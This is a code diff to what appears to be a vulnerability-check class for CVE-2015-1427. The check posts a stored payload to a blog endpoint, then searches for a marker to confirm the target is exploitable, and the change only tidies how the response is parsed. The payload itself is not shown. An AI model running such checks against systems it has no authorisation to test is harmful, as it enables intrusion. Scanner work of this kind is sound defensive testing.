@@ -35,11 +35,11 @@ class CVE_2015_1427_BaseVerify:
         """
         
         try:
-            data_req = await request.post(self.url + '/website/blog/', data = json.dumps(self.data_payload), headers = self.headers)
+            await request.post(self.url + '/website/blog/', data = json.dumps(self.data_payload), headers = self.headers)
             check_req = await request.post(self.url + '/_search?pretty', data = json.dumps(self.check_payload), headers = self.headers)
-            if check_req.status == 200 and self.capta in json.loads(await check_req.text())["hits"]["hits"][0]["fields"]["lupin"][0]:
+            result = await check_req.json()
+            if check_req.status == 200 and self.capta in result["hits"]["hits"][0]["fields"]["lupin"][0]:
                 return True
-            
         except Exception as e:
             # print(e)
             pass
